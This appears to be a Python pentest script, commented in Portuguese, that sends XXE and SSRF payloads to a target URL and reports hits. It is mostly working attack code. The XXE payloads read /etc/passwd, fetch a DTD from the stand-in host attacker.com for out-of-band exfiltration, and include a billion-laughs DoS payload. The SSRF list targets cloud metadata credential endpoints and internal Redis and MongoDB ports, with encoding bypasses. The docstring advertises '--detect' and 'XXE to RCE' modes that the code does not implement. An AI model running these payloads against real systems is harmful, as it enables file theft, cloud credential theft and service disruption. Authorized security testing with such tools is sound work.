#!/usr/bin/env python3
"""XXE & SSRF Payloader - Automatiza testes XXE e SSRF

Uso:
  python xxe-ssrf-payloader.py -u "http://example.com/upload" -t xxe
  python xxe-ssrf-payloader.py -u "http://example.com/fetch" -t ssrf
  python xxe-ssrf-payloader.py -u "http://example.com/api" -t both
  python xxe-ssrf-payloader.py -u "http://example.com" --detect

XXE Payloads:
  - File read: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  - Blind XXE: OOB exfiltration
  - XXE to RCE

SSRF Payloads:
  - Localhost: http://127.0.0.1:8080
  - AWS metadata: http://169.254.169.254/latest/meta-data/
  - Cloud services
  - Internal services
"""
import sys
import argparse
import requests
import json
import time
from urllib.parse import urljoin

class XXESsrfTester:
    def __init__(self, url, timeout=10):
        self.url = url
        self.timeout = timeout
        self.results = {
            'xxe': [],
            'ssrf': [],
            'tested': 0
        }
        requests.packages.urllib3.disable_warnings()

    def generate_xxe_payloads(self):
        """Gera XXE payloads."""
        payloads = [
            # File read
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>''',

            # Blind XXE (OOB)
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<foo/>''',

            # Parameter entity XXE
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % param SYSTEM "http://attacker.com/dtd.xml">
  %param;
]>
<foo/>''',

            # Wrapper protocol
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>''',

            # Billion laughs DoS
            '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>'''
        ]

        return payloads

    def generate_ssrf_payloads(self):
        """Gera SSRF payloads."""
        payloads = [
            # Localhost access
            'http://127.0.0.1:8080',
            'http://localhost:8080',
            'http://[::1]:8080',  # IPv6

            # AWS metadata
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',

            # Google metadata
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity',

            # Azure metadata
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',

            # Internal services
            'http://localhost/admin',
            'http://localhost:3000',
            'http://localhost:6379',  # Redis
            'http://localhost:27017',  # MongoDB

            # URL encoding bypass
            'http://127.0.0.1%3a8080',
            'http://localhost%3a8080',

            # Double encoding
            'http://127%2e0%2e0%2e1:8080',

            # Alternative notations
            'http://0x7f000001:8080',  # Hex notation
            'http://2130706433:8080',  # Decimal notation
        ]

        return payloads

    def test_xxe(self, parameter='xml', content_type='application/xml'):
        """Testa XXE."""
        print(f"\n[*] Testando XXE em '{parameter}'...")

        payloads = self.generate_xxe_payloads()

        for payload in payloads:
            self.results['tested'] += 1

            try:
                headers = {'Content-Type': content_type}
                response = requests.post(
                    self.url,
                    data=payload,
                    headers=headers,
                    timeout=self.timeout,
                    verify=False
                )

                # Verificar se revelou informações
                if 'root:x:0:0' in response.text or 'etc/passwd' in response.text:
                    self.results['xxe'].append({
                        'type': 'File Read',
                        'indication': 'Arquivo sensível revelado'
                    })
                    print(f"  [!] XXE ENCONTRADO - File Read!")

                if 'xxe' in response.text.lower():
                    print(f"  [!] XXE ENCONTRADO - Entity revelada!")
                    self.results['xxe'].append({
                        'type': 'Entity Injection',
                        'indication': 'Entidade XXE processada'
                    })

            except requests.Timeout:
                # DoS ou processamento lento
                self.results['xxe'].append({
                    'type': 'DoS/Processing',
                    'indication': 'Timeout detectado'
                })
                print(f"  [!] Possível XXE DoS!")

            except Exception as e:
                pass

    def test_ssrf(self, parameter='url'):
        """Testa SSRF."""
        print(f"\n[*] Testando SSRF em '{parameter}'...")

        payloads = self.generate_ssrf_payloads()

        for payload in payloads:
            self.results['tested'] += 1

            try:
                if self.method == 'GET':
                    test_url = self.url + (f"?{parameter}=" if '?' not in self.url else f"&{parameter}=") + payload
                    response = requests.get(test_url, timeout=self.timeout, verify=False)
                else:
                    data = {parameter: payload}
                    response = requests.post(self.url, data=data, timeout=self.timeout, verify=False)

                # Detectar SSRF
                if response.status_code in [200, 403, 502]:
                    if 'AWS' in response.text or 'SECURITY' in response.text or 'metadata' in response.text:
                        print(f"  [!] SSRF ENCONTRADO: {payload}")
                        self.results['ssrf'].append({
                            'payload': payload,
                            'status': response.status_code,
                            'indication': 'Resposta do serviço interno'
                        })

            except requests.Timeout:
                print(f"  [!] Timeout SSRF: {payload}")
                self.results['ssrf'].append({
                    'payload': payload,
                    'type': 'Timeout',
                    'indication': 'Serviço interno respondeu'
                })

            except Exception as e:
                pass

    def generate_report(self, output_file=None):
        """Gera relatório."""
        report = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'url': self.url,
            'summary': {
                'payloads_tested': self.results['tested'],
                'xxe_found': len(self.results['xxe']),
                'ssrf_found': len(self.results['ssrf'])
            },
            'xxe': self.results['xxe'],
            'ssrf': self.results['ssrf']
        }

        if output_file:
            with open(output_file, 'w') as f:
                json.dump(report, f, indent=2, default=str)
            print(f"\n[+] Relatório: {output_file}")

        return report

def main():
    parser = argparse.ArgumentParser(description="XXE & SSRF Payloader")
    parser.add_argument('-u', '--url', required=True, help='URL alvo')
    parser.add_argument('-t', '--type', default='both', help='xxe, ssrf, ou both')
    parser.add_argument('-m', '--method', default='POST', help='Método HTTP')
    parser.add_argument('-o', '--output', help='Arquivo JSON')

    args = parser.parse_args()

    print(f"\n{'='*70}")
    print(f"🔗 XXE & SSRF Payloader")
    print(f"{'='*70}\n")

    tester = XXESsrfTester(args.url)
    tester.method = args.method

    if args.type in ['xxe', 'both']:
        tester.test_xxe()
    if args.type in ['ssrf', 'both']:
        tester.test_ssrf()

    tester.generate_report(args.output)
    print("\n[✓] Testes completos!")

if __name__ == "__main__":
    main()
